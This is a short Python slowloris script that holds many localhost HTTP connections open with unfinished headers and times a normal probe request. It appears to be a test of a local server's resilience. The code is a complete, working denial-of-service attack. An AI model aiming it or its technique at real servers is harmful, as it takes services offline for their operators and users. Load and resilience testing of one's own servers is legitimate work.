#!/usr/bin/env python3
# slowloris.py <port> <conns> <seconds> [host]: hold <conns> connections with unfinished headers,
# then measure a normal request to <host> while they are held. Prints opened/alive counts.
import socket, sys, time, resource, urllib.request
port, n, secs = int(sys.argv[1]), int(sys.argv[2]), int(sys.argv[3])
host = sys.argv[4] if len(sys.argv) > 4 else 'hello.localhost'
resource.setrlimit(resource.RLIMIT_NOFILE, (min(n + 200, 10240), resource.getrlimit(resource.RLIMIT_NOFILE)[1]))
socks = []
for i in range(n):
    try:
        s = socket.create_connection(('127.0.0.1', port), timeout=3)
        s.send(b'GET / HTTP/1.1\r\nHost: %s:%d\r\n' % (host.encode(), port)); socks.append(s)
    except Exception as e:
        print('open failed at', i, e); break
print('opened', len(socks))
t0 = time.time()
while time.time() - t0 < secs:
    alive = 0
    for s in socks:
        try: s.send(b'X-a: b\r\n'); alive += 1
        except Exception: pass
    t = time.time()
    try:
        r = urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:%d/' % port, headers={'Host': '%s:%d' % (host, port)}), timeout=10)
        code = r.status
    except Exception as e: code = repr(e)[:60]
    print('t=%3d alive=%d probe=%s in %.2fs' % (time.time() - t0, alive, code, time.time() - t), flush=True)
    time.sleep(10)
